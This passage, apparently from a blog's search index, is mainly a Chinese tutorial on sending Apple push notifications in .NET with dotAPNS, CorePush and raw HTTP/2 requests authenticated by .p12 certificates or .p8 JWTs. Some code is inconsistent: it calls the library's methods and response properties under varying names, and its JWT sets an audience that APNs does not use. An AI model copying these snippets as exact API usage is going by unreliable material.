中小型企业，尤其是有安全合规需求的用户（商业版）。 选型参考：雷池付费选型参考 ","permalink":"https://qfsyso.github.io/posts/linux-firewalls-and-analysis-of-cloud-server-prices/","summary":"2025 年 8 月 11 日云服务器价格对比 阿里云 云服务器 ECS 配置 地区 带宽 (M) 系统盘 (GB) 价格 (元/月) 价格 (元/年) 备注 2C4G 杭州 5 40 330.91 2929 2C4G 杭州 5 40 - 2088 新用户优惠 2C4G 香港 5 40 535 4809 轻量云服务器 配置 地区 带宽 (M) 系统盘 (GB) 价格 (元/月) 价格 (元/年) 备注 2C4G 杭州 共享 200 50 70 714 4C8G 杭州 共享 200 70 220 2244 2C4G 杭州 共享 200 50 112 1142 4C8G 香港 共享 200 70 224 2284 腾讯云 云服务器 CVM 配置 地区 带宽 (M) 系统盘 (GB) 价格 (元/月) 价格 (元/年) 备注 2C4G 广州 5 50 156 1256 2C4G 香港 5 40 202.","title":"Linux Firewalls and Analysis of Cloud Server Prices"},{"content":"dotAPNS 通过 Apple Push Notification Service（APNs）发送推送通知的 .NET 库，采用官方推荐的 HTTP/2 API 实现方式。\n主要特性\n支持 HTTP/2 协议：符合 Apple 官方推荐的推送通知方式，适用于 iOS、macOS、watchOS 等平台。\n.NET 支持：兼容 .NET Framework 4.6、.NET Standard 2.0 和 2.1，适用于 ASP.NET Core 项目。\n简化集成：提供了 dotAPNS.AspNetCore 集成库，简化了在 ASP.NET Core 项目中的使用。\n认证方式：支持基于证书和基于令牌的认证方式，推荐使用令牌方式以避免证书转换的复杂性。\np12 使用 .p12 证书进行推送 dotAPNS 支持使用证书认证方式（.p12 文件）连接 APNs。 以下是使用 .p12 证书发送推送通知的基本步骤：\n加载证书： var cert = new X509Certificate2(\u0026#34;path_to_certificate.p12\u0026#34;, \u0026#34;certificate_password\u0026#34;); var apnsClient = ApnsClient.CreateUsingCert(cert); 构建推送通知：\nvar push = new ApplePush(ApplePushType.Alert) .AddAlert(\u0026#34;title\u0026#34;, \u0026#34;Hello, World!\u0026#34;) .AddToken(\u0026#34;device_token\u0026#34;); 发送通知：\nvar response = await apnsClient.SendAsync(push); 请确保替换上述代码中的 path_to_certificate.p12、certificate_password 和 device_token 为实际的证书路径、密码和设备令牌。\n获取 .p12 证书 要使用 .p12 证书进行推送，首先需要在 Apple Developer Center 创建一个推送证书并导出为 .p12 格式。以下是获取 .p12 证书的基本步骤：\n创建证书签名请求（CSR）： 在 macOS 上，打开 Keychain Access。\n选择 Keychain Access \u0026gt; Certificate Assistant \u0026gt; Request a Certificate From a Certificate Authority。\n输入电子邮件地址和常用名称，选择将请求保存到磁盘。\n保存生成的 .certSigningRequest 文件。\n在 Apple Developer Center 创建推送证书： 登录到 Apple Developer Center。\n导航到 Certificates, Identifiers \u0026amp; Profiles。\n在左侧菜单中选择 Certificates，然后点击右上角的 + 按钮。\n选择 Apple Push Notification service SSL (Sandbox \u0026amp; Production)，点击 Continue。\n选择 App ID，点击 Continue。\n上传之前生成的 .certSigningRequest 文件，点击 Continue。\n下载生成的 .cer 文件。\n导出 .p12 文件： 双击下载的 .cer 文件，将其添加到 Keychain Access 中。\n在 Keychain Access 中，找到证书，右键点击并选择 Export。\n选择导出格式为 .p12，设置密码保护文件。\n保存导出的 .p12 文件。\n请注意，.p12 证书每年需要更新。如果不想手动管理证书的更新，可以考虑使用 Apple 的 .p8 推送密钥，它不需要每年更新。\ncode dotnet add package dotAPNS dotnet add package dotAPNS.AspNetCore using System; using System.Security.Cryptography.X509Certificates; using System.Threading.Tasks; using dotAPNS; class Program { static async Task Main(string[] args) { var cert = new X509Certificate2(\u0026#34;path_to_certificate.p12\u0026#34;, \u0026#34;certificate_password\u0026#34;); var apnsClient = ApnsClient.CreateUsingCert(cert); var push = new ApplePush(ApplePushType.Alert) .AddAlert(\u0026#34;title\u0026#34;, \u0026#34;Hello, World!\u0026#34;) .AddToken(\u0026#34;device_token\u0026#34;); var response = await apnsClient.SendAsync(push); Console.WriteLine($\u0026#34;Push notification sent. Response: {response.StatusCode}\u0026#34;); } } p8 dotAPNS 是一个用于通过 Apple 推送通知服务（APNs）发送推送通知的 .NET 库，支持 HTTP/2 协议。它提供了两种主要的连接方式：证书方式和令牌方式。令牌方式更为简便，不需要进行证书转换。\n以下是一个简单的示例，展示如何使用 dotAPNS 通过令牌方式发送推送通知：\nusing System; using System.Net.Http; using System.Threading.Tasks; using dotAPNS; using dotAPNS.Model; using dotAPNS.Model.Payload; class Program { static async Task Main(string[] args) { var options = new ApnsJwtOptions { BundleId = \u0026#34;com.yourapp.bundle\u0026#34;, // 替换为应用 Bundle ID CertContent = @\u0026#34;-----BEGIN PRIVATE KEY----- MIGTA...（私钥内容） -----END PRIVATE KEY-----\u0026#34;, // 替换为 .p8 私钥内容 KeyId = \u0026#34; Key ID\u0026#34;, // 替换为 Key ID TeamId = \u0026#34; Team ID\u0026#34; // 替换为 Team ID }; var apns = ApnsClient.CreateUsingJwt(new HttpClient(), options); var push = new ApplePush(ApplePushType.Alert) .AddAlert(\u0026#34;通知标题\u0026#34;, \u0026#34;通知内容\u0026#34;) .AddToken(\u0026#34;设备的推送令牌\u0026#34;); // 替换为目标设备的推送令牌 try { var response = await apns.Send(push); if (response.IsSuccessful) { Console.WriteLine(\u0026#34;通知发送成功！\u0026#34;); } else { Console.WriteLine($\u0026#34;发送失败：{response.ReasonString}\u0026#34;); } } catch (Exception ex) { Console.WriteLine($\u0026#34;发生错误：{ex.Message}\u0026#34;); } } } 注意事项：\n在使用令牌方式时，需要从 Apple 开发者账户中获取以下信息：\nBundle ID\nKey ID\nTeam ID\n.p8 格式的私钥内容\n如果使用的是 .NET Framework，请确保 HttpClient 实例支持 HTTP/2。可以通过安装 System.Net.Http.WinHttpHandler NuGet 包，并使用 WinHttpHandler 来实现：\nvar apns = ApnsClient.CreateUsingJwt(new HttpClient(new WinHttpHandler()), options); //在发送通知时，可以根据需要添加其他内容，如声音、角标等： var push = new ApplePush(ApplePushType.Alert) .AddAlert(\u0026#34;通知标题\u0026#34;, \u0026#34;通知内容\u0026#34;) .AddSound(\u0026#34;default\u0026#34;) .AddBadge(1) .AddToken(\u0026#34;设备的推送令牌\u0026#34;); 依赖注入 配置服务 在 Startup.cs 或 Program.cs 文件中，配置 dotAPNS 服务： 使用 .p12 证书注入 IApnsClient\nusing System.Security.Cryptography.X509Certificates; using dotAPNS; var builder = WebApplication.CreateBuilder(args); // 加载 .p12 证书，替换为你实际路径和密码 var certificate = new X509Certificate2(\u0026#34;path_to_certificate.p12\u0026#34;, \u0026#34;certificate_password\u0026#34;); // 注入 APNs 客户端，使用证书认证 builder.Services.AddApnsClient(options =\u0026gt; { options.UseCertificate(certificate); }); builder.Services.AddControllers(); var app = builder.Build(); app.MapControllers(); app.Run(); // 或者使用 .p8 证书配置 APNs 客户端 // services.AddApnsClient(options =\u0026gt; // { // options.UseToken(\u0026#34;team_id\u0026#34;, \u0026#34;key_id\u0026#34;, \u0026#34;path_to_key.p8\u0026#34;); // }); 请确保将 \u0026ldquo;path_to_certificate.p12\u0026rdquo;、\u0026ldquo;certificate_password\u0026rdquo;、\u0026ldquo;team_id\u0026rdquo;、\u0026ldquo;key_id\u0026rdquo; 和 \u0026ldquo;path_to_key.p8\u0026rdquo; 替换为实际证书路径、密码和密钥信息。\n创建推送通知控制器 在控制器中，可以使用注入的 IApnsClient 来发送推送通知：\nusing Microsoft.AspNetCore.Mvc; using dotAPNS; using System.Threading.Tasks; [Route(\u0026#34;api/[controller]\u0026#34;)] [ApiController] public class PushNotificationController : ControllerBase { private readonly IApnsClient _apnsClient; public PushNotificationController(IApnsClient apnsClient) { _apnsClient = apnsClient; } [HttpPost(\u0026#34;send\u0026#34;)] public async Task\u0026lt;IActionResult\u0026gt; SendPushNotification([FromBody] PushNotificationRequest request) { var push = new ApplePush(ApplePushType.Alert) .AddAlert(\u0026#34;title\u0026#34;, request.Title) .AddAlert(\u0026#34;body\u0026#34;, request.Body) .AddToken(request.DeviceToken); var response = await _apnsClient.SendAsync(push); if (response.StatusCode == System.Net.HttpStatusCode.OK) { return Ok(\u0026#34;Push notification sent successfully.\u0026#34;); } else { return StatusCode((int)response.StatusCode, \u0026#34;Failed to send push notification.\u0026#34;); } } } public class PushNotificationRequest { public string DeviceToken { get; set; } public string Title { get; set; } public string Body { get; set; } } PushNotificationRequest 类用于接收客户端发送的推送通知请求。SendPushNotification 方法使用注入的 IApnsClient 发送推送通知，并根据响应返回相应的结果。\n.p12 using Microsoft.AspNetCore.Mvc; using dotAPNS; using System.Threading.Tasks; [ApiController] [Route(\u0026#34;api/[controller]\u0026#34;)] public class PushNotificationController : ControllerBase { private readonly IApnsClient _apnsClient; public PushNotificationController(IApnsClient apnsClient) { _apnsClient = apnsClient; } [HttpPost(\u0026#34;send\u0026#34;)] public async Task\u0026lt;IActionResult\u0026gt; SendPush([FromBody] PushNotificationRequest request) { var push = new ApplePush(ApplePushType.Alert) .AddAlert(\u0026#34;title\u0026#34;, request.Title) .AddAlert(\u0026#34;body\u0026#34;, request.Body) .AddToken(request.DeviceToken); var response = await _apnsClient.SendAsync(push); if (response.StatusCode == System.Net.HttpStatusCode.OK) { return Ok(\u0026#34;Push notification sent successfully.\u0026#34;); } else { return StatusCode((int)response.StatusCode, $\u0026#34;Failed to send push notification: {response.Reason}\u0026#34;); } } } public class PushNotificationRequest { public string DeviceToken { get; set; } public string Title { get; set; } public string Body { get; set; } } .p8 .p8 证书进行推送通知，需要在 Apple Developer Center 创建一个推送密钥，并获取 Team ID 和 Key ID。\npublic void ConfigureServices(IServiceCollection services) { services.AddApnsClient(options =\u0026gt; { options.UseToken(\u0026#34;team_id\u0026#34;, \u0026#34;key_id\u0026#34;, \u0026#34;path_to_key.p8\u0026#34;); }); services.AddControllers(); } 请确保将 \u0026#34;team_id\u0026#34;、\u0026#34;key_id\u0026#34; 和 \u0026#34;path_to_key.p8\u0026#34; 替换为实际信息。 ## 测试推送通知 POST /api/pushnotification/send 端点发送 JSON ： ```json { \u0026#34;deviceToken\u0026#34;: \u0026#34;device_token\u0026#34;, \u0026#34;title\u0026#34;: \u0026#34;Hello\u0026#34;, \u0026#34;body\u0026#34;: \u0026#34;This is a test push notification.\u0026#34; } \u0026ldquo;device_token\u0026rdquo; 替换为实际设备令牌。\n沙盒环境 string DevelopmentEndpoint = \u0026#34;https://api.sandbox.push.apple.com\u0026#34;; const string ProductionEndpoint = \u0026#34;https://api.push.apple.com\u0026#34;; //... var cert = new X509Certificate2(\u0026#34;aps_development.p12\u0026#34;, \u0026#34;123zxcvb\u0026#34;); // var apnsClient = ApnsClient.CreateUsingCert(cert); var apnsClient = ApnsClient.CreateUsingCert(cert).UseSandbox(); var push = new ApplePush(ApplePushType.Alert) .AddAlert(\u0026#34;title\u0026#34;, \u0026#34; test Hell123333!\u0026#34;) .AddToken(\u0026#34;xxx\u0026#34;); 声音 var push = new ApplePush(ApplePushType.Alert) .AddAlert(\u0026#34;title\u0026#34;, \u0026#34;test Hello, World!\u0026#34;) .AddSound(\u0026#34;default\u0026#34;) // 系统默认声音 // 如果是自定义声音文件，如 \u0026#34;ring.caf\u0026#34;，需在 App Bundle 里有该文件 // .AddSound(\u0026#34;ring.caf\u0026#34;) .AddToken(\u0026#34;xxxToken\u0026#34;); var response = await apnsClient.SendAsync(push); Console.WriteLine($\u0026#34;APNs Response: {response.StatusCode} - {response.Reason}\u0026#34;); 如果使用 \u0026ldquo;default\u0026rdquo;，iOS 会播放系统默认推送声音。\n如果是自定义声音文件：\n必须放在 Xcode 项目的 App bundle 里\n格式必须是 .aiff、.wav 或 .caf\nApp 必须开启推送声音权限（在 iOS 设置中启用）。\n角标 var push = new ApplePush(ApplePushType.Alert) .AddAlert(\u0026#34;title\u0026#34;, \u0026#34;测试推送标题\u0026#34;) .AddAlert(\u0026#34;body\u0026#34;, \u0026#34;这是推送内容，带声音和角标\u0026#34;) .AddSound(\u0026#34;default\u0026#34;) // 系统默认声音 // .AddSound(\u0026#34;ring.caf\u0026#34;) // 如果是自定义声音 .AddBadge(3) // 角标数字 .AddCustomProperty(\u0026#34;type\u0026#34;, \u0026#34;chat\u0026#34;) // 自定义参数 .AddCustomProperty(\u0026#34;messageId\u0026#34;, \u0026#34;msg_001\u0026#34;) .AddToken(\u0026#34;xxxToken\u0026#34;); 使用 CorePush p8 下面是一个基于 CorePush（又名 net-core-push-notifications）库的完整示例，展示如何在 .NET 中使用其发送 Apple APNs 推送通知：\n安装 CorePush 在 .NET 项目中安装 CorePush 库：\ndotnet add package CorePush 设置依赖项与配置注入（依赖注入架构推荐） 在 Startup.cs 或 Program.cs 中注册 HttpClient 与配置类：\nservices.AddHttpClient\u0026lt;ApnSender\u0026gt;(); // 若需要发送 Android/Web 通知，再添加 FcmSender var apnSettings = configuration.GetSection(\u0026#34;ApnSettings\u0026#34;).Get\u0026lt;ApnSettings\u0026gt;(); services.AddSingleton(apnSettings); 这里 ApnSettings 可以从配置文件（如 appsettings.json）中绑定，包含 p8 私钥、Key ID、Team ID、Bundle ID 与目标环境（开发／生产）等。\n构造 APNs 消息并发送 以下代码展示了如何创建推送消息并发送：\n// 定义通知结构 public class AppleNotification { public ApsPayload Aps { get; set; } public object Data { get; set; } // 可选：携带自定义数据 } public class ApsPayload { [JsonProperty(\u0026#34;alert\u0026#34;)] public string AlertBody { get; set; } } // 接收配置的 ApnSettings 示例 var settingsApn = new ApnSettings { AppBundleIdentifier = \u0026#34;com.mycompany.myapp\u0026#34;, P8PrivateKey = \u0026#34; p8 私钥（无空格/换行）\u0026#34;, P8PrivateKeyId = \u0026#34;10 位 Key ID\u0026#34;, TeamId = \u0026#34; Apple 团队 ID\u0026#34;, ServerType = ApnServerType.Development // 或 Production }; // 创建 HttpClient（若不使用 DI 可直接 new HttpClient） using var httpClient = new HttpClient(); var apn = new ApnSender(settingsApn, httpClient); var notification = new AppleNotification { Aps = new ApsPayload { AlertBody = \u0026#34;Hello from CorePush!\u0026#34; }, Data = new { customKey = \u0026#34;customValue\u0026#34; } // Optional }; var deviceToken = \u0026#34;目标设备的 device token\u0026#34;; var response = await apn.SendAsync(notification, deviceToken); 简洁 API 接口说明 构造 ApnSender(settings, httpClient) 时会自动生成并签署 JWT，适用于 Apple HTTP/2 推送 API\n然后通过 await apn.SendAsync(notification, deviceToken) 发起请求，操作非常直观简洁\n安装库 dotnet add package CorePush 配置API 提供 p8 私钥、Key ID、Team ID、Bundle ID、ServerType 创建通知对象 包含 aps.alert 字段（与可选自定义数据） 发送 使用 ApnSender.SendAsync() 进行推送\n自定义APNS p8 dotnet add package System.IdentityModel.Tokens.Jwt dotnet add package Microsoft.IdentityModel.Tokens using System; using System.Net.Http; using System.Net.Http.Headers; using System.Security.Cryptography; using System.Text; using System.Text.Json; using System.Threading.Tasks; using Microsoft.IdentityModel.Tokens; using System.IdentityModel.Tokens.Jwt; class ApnsSender { // p8文件内容（去掉-----BEGIN PRIVATE KEY-----...等头尾） private const string PrivateKey = @\u0026#34; MIGHAg....oUAmDj \u0026#34;; private const string KeyId = \u0026#34;YOUR_KEY_ID\u0026#34;; // Key ID (from Apple Developer portal) private const string TeamId = \u0026#34;YOUR_TEAM_ID\u0026#34;; // Team ID (Apple Developer account) private const string BundleId = \u0026#34;com.example.app\u0026#34;; // App Bundle ID (apns-topic) private const string DeviceToken = \u0026#34;device_token_here\u0026#34;; static async Task Main() { string jwtToken = GenerateJwtToken(PrivateKey, KeyId, TeamId); var payload = new { aps = new { alert = new { title = \u0026#34;Hello\u0026#34;, body = \u0026#34;This is a test push notification.\u0026#34; }, sound = \u0026#34;default\u0026#34; } }; string jsonPayload = JsonSerializer.Serialize(payload); using var client = new HttpClient(); var request = new HttpRequestMessage(HttpMethod.Post, $\u0026#34;https://api.push.apple.com/3/device/{DeviceToken}\u0026#34;) { Version = new Version(2, 0), Content = new StringContent(jsonPayload, Encoding.UTF8, \u0026#34;application/json\u0026#34;) }; // 设置 HTTP/2 头 request.Headers.Authorization = new AuthenticationHeaderValue(\u0026#34;bearer\u0026#34;, jwtToken); request.Headers.TryAddWithoutValidation(\u0026#34;apns-topic\u0026#34;, BundleId); request.Headers.TryAddWithoutValidation(\u0026#34;apns-push-type\u0026#34;, \u0026#34;alert\u0026#34;); request.Headers.TryAddWithoutValidation(\u0026#34;apns-priority\u0026#34;, \u0026#34;10\u0026#34;); try { var response = await client.SendAsync(request); string responseContent = await response.Content.ReadAsStringAsync(); Console.WriteLine($\u0026#34;StatusCode: {response.StatusCode}\u0026#34;); Console.WriteLine($\u0026#34;Response: {responseContent}\u0026#34;); } catch (Exception ex) { Console.WriteLine($\u0026#34;Exception: {ex}\u0026#34;); } } // 生成 JWT Token private static string GenerateJwtToken(string privateKey, string keyId, string teamId) { // 解析私钥为ECDsa using var ecdsa = ECDsa.Create(); ecdsa.ImportPkcs8PrivateKey(Convert.FromBase64String(privateKey.Trim()), out _); var securityKey = new ECDsaSecurityKey(ecdsa) { KeyId = keyId }; var credentials = new SigningCredentials(securityKey, SecurityAlgorithms.EcdsaSha256); var header = new JwtHeader(credentials); header[\u0026#34;kid\u0026#34;] = keyId; var payload = new JwtPayload( issuer: teamId, audience: \u0026#34;https://appleid.apple.com\u0026#34;, claims: null, notBefore: null, expires: DateTime.UtcNow.AddMinutes(20), issuedAt: DateTime.UtcNow); var token = new JwtSecurityToken(header, payload); return new JwtSecurityTokenHandler().WriteToken(token); } } 说明 PrivateKey要填的是 .p8 文件内纯私钥内容（PEM 格式去掉头尾和换行），你可以用文本编辑器打开 .p8 文件，去掉首尾 \u0026mdash;\u0026ndash;BEGIN PRIVATE KEY\u0026mdash;\u0026ndash; 和 \u0026mdash;\u0026ndash;END PRIVATE KEY\u0026mdash;\u0026ndash; 以及所有换行符，只留下中间的 Base64 字符串。\nKeyId：Apple Developer Portal 中创建 .p8 时生成的 Key ID。\nTeamId： Apple 开发者团队 ID。\nBundleId： App Bundle Identifier，做为 apns-topic。\n生成的 JWT 有效期一般不要超过 1 小时，示例中用了 20 分钟。\n发送请求时必须用 HTTP/2，所以 HttpRequestMessage.Version=2.0。\nAPNs 域名默认生产环境，测试可替换成 https://api.sandbox.push.apple.com。\np12 MyAPNS static async Task MyAPNS(string tk, string tt, string con1) { string p12Path = \u0026#34;aps_development.p12\u0026#34;; // p12文件路径 string p12Password = \u0026#34;xxx\u0026#34;; // p12密码 string deviceToken = tk; string apnsTopic = \u0026#34;com.xxx.xxx\u0026#34;; // App Bundle ID if (!File.Exists(p12Path)) Console.WriteLine(\u0026#34;证书文件不存在：\u0026#34; + p12Path); // 读取 p12 证书 //var cert = new X509Certificate2(p12Path, p12Password, // X509KeyStorageFlags.MachineKeySet | // X509KeyStorageFlags.PersistKeySet | // X509KeyStorageFlags.Exportable); var cert = new X509Certificate2(p12Path, p12Password); var handler = new HttpClientHandler(); handler.ClientCertificates.Add(cert); // 要求HTTP/2 handler.SslProtocols = System.Security.Authentication.SslProtocols.Tls12; using var client = new HttpClient(handler); // APNs 生产环境地址，沙箱环境用 api.sandbox.push.apple.com // https://api.push.apple.com/3/device/ 正式 var apnsUrl = $\u0026#34;https://api.sandbox.push.apple.com/3/device/{deviceToken}\u0026#34;; // 构造推送负载 var payload = new { aps = new { alert = new { title = tt, body = con1 }, sound = \u0026#34;default\u0026#34; } }; string jsonPayload = System.Text.Json.JsonSerializer.Serialize(payload); using var content = new StringContent(jsonPayload, Encoding.UTF8, \u0026#34;application/json\u0026#34;); // 构造 HttpRequestMessage var request = new HttpRequestMessage(HttpMethod.Post, apnsUrl) { Version = new Version(2, 0), // HTTP/2 Content = content }; // APNs 需要的头 // 这里用证书认证，不需要 authorization 头。如果用 Token 认证才用此头 // request.Headers.Authorization = new AuthenticationHeaderValue(\u0026#34;bearer\u0026#34;, \u0026#34;\u0026lt;your_jwt_token\u0026gt;\u0026#34;); request.Headers.TryAddWithoutValidation(\u0026#34;apns-topic\u0026#34;, apnsTopic); request.Headers.TryAddWithoutValidation(\u0026#34;apns-push-type\u0026#34;, \u0026#34;alert\u0026#34;); // alert, background等 request.Headers.TryAddWithoutValidation(\u0026#34;apns-priority\u0026#34;, \u0026#34;10\u0026#34;); // 10（立即推送）或 5（节省电量） try { var response = await client.SendAsync(request); string respContent = await response.Content.ReadAsStringAsync(); Console.WriteLine($\u0026#34;Status: {response.StatusCode}\u0026#34;); Console.WriteLine($\u0026#34;Response: {respContent}\u0026#34;); } catch (Exception ex) { Console.WriteLine($\u0026#34;Exception: {ex.Message}\u0026#34;); } } 调用 await MyAPNS(\u0026#34;xxx\u0026#34;, \u0026#34;T1\u0026#34;, \u0026#34;HIHIHI\u0026#34;); 静态单例 实现证书加载和 HttpClient 复用，并确保支持多线程调用（多个线程/任务安全且不会卡死）。\nusing System; using System.IO; using System.Net.Http; using System.Security.Cryptography.X509Certificates; using System.Text; using System.Threading.Tasks; public class ApnsClient { private static readonly string p12Path = \u0026#34;aps_development.p12\u0026#34;; private static readonly string p12Password = \u0026#34;xxx\u0026#34;; private static readonly string apnsTopic = \u0026#34;com.xxx.xxx\u0026#34;; private static readonly X509Certificate2 certificate; private static readonly HttpClient httpClient; // 静态构造函数初始化证书和 HttpClient，保证只执行一次 static ApnsClient() { if (!File.Exists(p12Path)) throw new FileNotFoundException(\u0026#34;证书文件不存在：\u0026#34; + p12Path); certificate = new X509Certificate2(p12Path, p12Password, X509KeyStorageFlags.MachineKeySet | X509KeyStorageFlags.PersistKeySet | X509KeyStorageFlags.Exportable); var handler = new HttpClientHandler(); handler.ClientCertificates.Add(certificate); handler.SslProtocols = System.Security.Authentication.SslProtocols.Tls12; httpClient = new HttpClient(handler) { Timeout = TimeSpan.FromSeconds(30) // 根据需要调整超时 }; } public static async Task SendPushAsync(string deviceToken, string title, string body, bool useSandbox = true) { var apnsUrl = useSandbox ? $\u0026#34;https://api.sandbox.push.apple.com/3/device/{deviceToken}\u0026#34; : $\u0026#34;https://api.push.apple.com/3/device/{deviceToken}\u0026#34;; var payload = new { aps = new { alert = new { title, body }, sound = \u0026#34;default\u0026#34; } }; string jsonPayload = System.Text.Json.JsonSerializer.Serialize(payload); using var content = new StringContent(jsonPayload, Encoding.UTF8, \u0026#34;application/json\u0026#34;); var request = new HttpRequestMessage(HttpMethod.Post, apnsUrl) { Version = new Version(2, 0), Content = content }; request.Headers.TryAddWithoutValidation(\u0026#34;apns-topic\u0026#34;, apnsTopic); request.Headers.TryAddWithoutValidation(\u0026#34;apns-push-type\u0026#34;, \u0026#34;alert\u0026#34;); request.Headers.TryAddWithoutValidation(\u0026#34;apns-priority\u0026#34;, \u0026#34;10\u0026#34;); var response = await httpClient.SendAsync(request).ConfigureAwait(false); string respContent = await response.Content.ReadAsStringAsync().ConfigureAwait(false); Console.WriteLine($\u0026#34;Status: {response.StatusCode}\u0026#34;); Console.WriteLine($\u0026#34;Response: {respContent}\u0026#34;); } } 这样调用即可支持多线程\nasync Task TestMultiplePush() { var tasks = new Task[10]; for (int i = 0; i \u0026lt; 10; i++) { tasks[i] = ApnsClient.SendPushAsync(\u0026#34;device_token_\u0026#34; + i, \u0026#34;Title \u0026#34; + i, \u0026#34;Body \u0026#34; + i); } await Task.WhenAll(tasks); } 线程限流 + 失败重试 using System; using System.Collections.Concurrent; using System.IO; using System.Linq; using System.Net.Http; using System.Security.Cryptography.X509Certificates; using System.Text; using System.Threading; using System.Threading.Tasks; public static class ApnsPushService { private static readonly string P12Path = \u0026#34;aps_development.p12\u0026#34;; private static readonly string P12Password = \u0026#34;xxx\u0026#34;; private static readonly string ApnsTopic = \u0026#34;com.xxx.xxx\u0026#34;; private static readonly X509Certificate2 Certificate; private static readonly HttpClient Client; // 限流参数 private static readonly int MaxPushPerSecond = 5; // 每秒最多推送 N 条 private static readonly SemaphoreSlim RateLimitLock = new SemaphoreSlim(MaxPushPerSecond, MaxPushPerSecond); private static readonly ConcurrentQueue\u0026lt;DateTime\u0026gt; PushTimestamps = new ConcurrentQueue\u0026lt;DateTime\u0026gt;(); static ApnsPushService() { if (!File.Exists(P12Path)) throw new FileNotFoundException($\u0026#34;证书文件不存在: {P12Path}\u0026#34;); Certificate = new X509Certificate2(P12Path, P12Password, X509KeyStorageFlags.MachineKeySet | X509KeyStorageFlags.PersistKeySet | X509KeyStorageFlags.Exportable); var handler = new HttpClientHandler(); handler.ClientCertificates.Add(Certificate); handler.SslProtocols = System.Security.Authentication.SslProtocols.Tls12; Client = new HttpClient(handler) { Timeout = TimeSpan.FromSeconds(15) }; } public static async Task SendPushAsync(string deviceToken, string title, string body, bool sandbox = true) { await EnforceRateLimit(); int maxRetries = 3; int delayMs = 1000; for (int attempt = 1; attempt \u0026lt;= maxRetries; attempt++) { try { string url = sandbox ? $\u0026#34;https://api.sandbox.push.apple.com/3/device/{deviceToken}\u0026#34; : $\u0026#34;https://api.push.apple.com/3/device/{deviceToken}\u0026#34;; var payload = new { aps = new { alert = new { title, body }, sound = \u0026#34;default\u0026#34; } }; var json = System.Text.Json.JsonSerializer.Serialize(payload); using var content = new StringContent(json, Encoding.UTF8, \u0026#34;application/json\u0026#34;); var request = new HttpRequestMessage(HttpMethod.Post, url) { Version = new Version(2, 0), Content = content }; request.Headers.TryAddWithoutValidation(\u0026#34;apns-topic\u0026#34;, ApnsTopic); request.Headers.TryAddWithoutValidation(\u0026#34;apns-push-type\u0026#34;, \u0026#34;alert\u0026#34;); request.Headers.TryAddWithoutValidation(\u0026#34;apns-priority\u0026#34;, \u0026#34;10\u0026#34;); var response = await Client.SendAsync(request).ConfigureAwait(false); string resp = await response.Content.ReadAsStringAsync().ConfigureAwait(false); if (response.IsSuccessStatusCode) { Console.WriteLine($\u0026#34;✅ 成功 [{deviceToken}] - {title}\u0026#34;); return; } else { Console.WriteLine($\u0026#34;⚠️ 推送失败 [{response.StatusCode}] 尝试 {attempt}/{maxRetries} - {resp}\u0026#34;); // APNs 临时性错误才重试 if (response.StatusCode == System.Net.HttpStatusCode.ServiceUnavailable || (int)response.StatusCode == 429) { await Task.Delay(delayMs); delayMs *= 2; // 退避 continue; } else { return; // 其它错误直接放弃 } } } catch (HttpRequestException ex) { Console.WriteLine($\u0026#34;网络异常 [{attempt}/{maxRetries}] - {ex.Message}\u0026#34;); await Task.Delay(delayMs); delayMs *= 2; } } } private static async Task EnforceRateLimit() { DateTime now = DateTime.UtcNow; // 移除超过 1 秒的时间戳 while (PushTimestamps.TryPeek(out var ts) \u0026amp;\u0026amp; (now - ts).TotalSeconds \u0026gt;= 1) { PushTimestamps.TryDequeue(out _); } // 如果已达到每秒上限，则等待 while (PushTimestamps.Count \u0026gt;= MaxPushPerSecond) { await Task.Delay(100); now = DateTime.UtcNow; while (PushTimestamps.TryPeek(out var ts2) \u0026amp;\u0026amp; (now - ts2).TotalSeconds \u0026gt;= 1) { PushTimestamps.TryDequeue(out _); } } PushTimestamps.Enqueue(now); } } var tokens = new[] { \u0026#34;token1\u0026#34;, \u0026#34;token2\u0026#34;, \u0026#34;token3\u0026#34;, \u0026#34;token4\u0026#34;, \u0026#34;token5\u0026#34;, \u0026#34;token6\u0026#34; }; var tasks = tokens.Select((tk, i) =\u0026gt; ApnsPushService.SendPushAsync(tk, $\u0026#34;Title {i}\u0026#34;, $\u0026#34;Body {i}\u0026#34;) ); await Task.WhenAll(tasks); 限流 MaxPushPerSecond 控制每秒最多推送几条。 超过会等待，保证 APNs 不拒绝。\n重试 仅对临时性错误（429、503、网络错误）重试，最大重试 3 次，每次延迟翻倍。\n线程安全 HttpClient 和证书是静态单例，支持多线程并发调用。\n可扩展 你可以把 MaxPushPerSecond 改大，或者把 maxRetries、delayMs 改成配置项。\n日志持久化 using System; using System.Collections.Concurrent; using System.IO; using System.Linq; using System.Net.Http; using System.Security.Cryptography.X509Certificates; using System.Text; using System.Threading; using System.Threading.Tasks; public static class ApnsPushService { private static readonly string P12Path = \u0026#34;aps_development.p12\u0026#34;; private static readonly string P12Password = \u0026#34;xxx\u0026#34;; private static readonly string ApnsTopic = \u0026#34;com.xxx.xxx\u0026#34;; private static readonly X509Certificate2 Certificate; private static readonly HttpClient Client; // 限流参数 private static readonly int MaxPushPerSecond = 5; // 每秒最多推送 N 条 private static readonly ConcurrentQueue\u0026lt;DateTime\u0026gt; PushTimestamps = new ConcurrentQueue\u0026lt;DateTime\u0026gt;(); private static readonly string LogFilePath = \u0026#34;apns_failures.log\u0026#34;; private static readonly SemaphoreSlim LogFileLock = new SemaphoreSlim(1, 1); static ApnsPushService() { if (!File.Exists(P12Path)) throw new FileNotFoundException($\u0026#34;证书文件不存在: {P12Path}\u0026#34;); Certificate = new X509Certificate2(P12Path, P12Password, X509KeyStorageFlags.MachineKeySet | X509KeyStorageFlags.PersistKeySet | X509KeyStorageFlags.Exportable); var handler = new HttpClientHandler(); handler.ClientCertificates.Add(Certificate); handler.SslProtocols = System.Security.Authentication.SslProtocols.Tls12; Client = new HttpClient(handler) { Timeout = TimeSpan.FromSeconds(15) }; } public static async Task SendPushAsync(string deviceToken, string title, string body, bool sandbox = true) { await EnforceRateLimit(); int maxRetries = 3; int delayMs = 1000; for (int attempt = 1; attempt \u0026lt;= maxRetries; attempt++) { try { string url = sandbox ? $\u0026#34;https://api.sandbox.push.apple.com/3/device/{deviceToken}\u0026#34; : $\u0026#34;https://api.push.apple.com/3/device/{deviceToken}\u0026#34;; var payload = new { aps = new { alert = new { title, body }, sound = \u0026#34;default\u0026#34; } }; var json = System.Text.Json.JsonSerializer.Serialize(payload); using var content = new StringContent(json, Encoding.UTF8, \u0026#34;application/json\u0026#34;); var request = new HttpRequestMessage(HttpMethod.Post, url) { Version = new Version(2, 0), Content = content }; 